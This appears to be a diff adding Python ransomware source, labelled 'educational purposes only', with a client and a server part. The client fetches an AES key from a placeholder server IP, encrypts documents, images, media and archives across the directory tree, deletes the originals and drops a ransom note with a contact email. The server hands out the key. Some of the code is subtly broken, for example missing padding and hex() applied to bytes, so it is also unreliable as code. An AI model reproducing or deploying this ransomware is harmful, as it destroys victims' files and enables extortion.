@@ -1,0 +1,110 @@
+Ransomware Educational Purposes ONLY
+
+#Client Side
+import os
+import socket
+import random
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+# Replace with your server IP and port
+server_ip = "YOUR_SERVICE_IP"
+server_port = 8080
+
+# Connect to the server to receive encryption key
+client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_sock.connect((server_ip, server_port))
+key = client_sock.recv(32)
+client_sock.close()
+
+# Generate a random IV and salt
+iv = get_random_bytes(16)
+salt = get_random_bytes(16)
+
+# Function to encrypt files
+def encrypt_file(file_path):
+    with open(file_path, "rb") as file:
+        data = file.read()
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted_data = cipher.encrypt(data)
+    with open(file_path + ".encrypted", "wb") as encrypted_file:
+        encrypted_file.write(salt + iv + encrypted_data)
+    os.remove(file_path)
+
+# Function to decrypt files
+def decrypt_file(file_path):
+    with open(file_path, "rb") as file:
+        encrypted_data = file.read()
+    salt = encrypted_data[:16]
+    iv = encrypted_data[16:32]
+    data = encrypted_data[32:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = cipher.decrypt(data)
+    with open(file_path[:-10], "wb") as decrypted_file:
+        decrypted_file.write(decrypted_data)
+    os.remove(file_path)
+
+# Encrypt all files in the current directory and its subdirectories
+for root, dirs, files in os.walk("."):
+    for file in files:
+        if file.lower().endswith(('.doc', '.docx', '.pdf', '.png', '.jpg', '.txt', '.mp3', '.mp4', '.zip', '.rar')):
+            file_path = os.path.join(root, file)
+            encrypt_file(file_path)
+
+# Display the ransom note
+ransom_note = "Your files have been encrypted. To decrypt them, please connect to your system and pay the ransom.\n"
+ransom_note += "Your unique decryption key is: " + hex(key) + "\n"
+ransom_note += "Contact us at ransom_support@mail.com for further instructions.\n"
+with open("ransom_note.txt", "w") as ransom_file:
+    ransom_file.write(ransom_note)
+  
+#Server side
+import socket
+import os
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
+
+# Define the encryption key and initialization vector
+key = get_random_bytes(32)
+iv = get_random_bytes(16)
+
+# Set up the server socket
+server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_sock.bind(('0.0.0.0', 8080))
+server_sock.listen(1)
+
+# Wait for a connection from the client
+client_sock, client_address = server_sock.accept()
+
+# Send the encryption key to the client
+client_sock.send(key)
+
+# Listen for decryption requests
+while True:
+    try:
+        # Receive the encrypted file path from the client
+        encrypted_file_path = client_sock.recv(1024).decode()
+        if not os.path.exists(encrypted_file_path):
+            client_sock.send(b"File not found.")
+            continue
+
+        # Decrypt the file
+        with open(encrypted_file_path, "rb") as encrypted_file:
+            salt = encrypted_file.read(16)
+            iv = encrypted_file.read(16)
+            encrypted_data = encrypted_file.read()
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decrypted_data = cipher.decrypt(pad(encrypted_data, AES.block_size))
+
+        # Write the decrypted data to the original file path
+        with open(encrypted_file_path[:-10], "wb") as decrypted_file:
+            decrypted_file.write(decrypted_data)
+
+        # Notify the client of successful decryption
+        client_sock.send(b"Decryption successful.")
+    except Exception as e:
+        print(f"Error occurred: {e}")
+        client_sock.send(b"An error has occurred.")
+        client_sock.close()
+        break
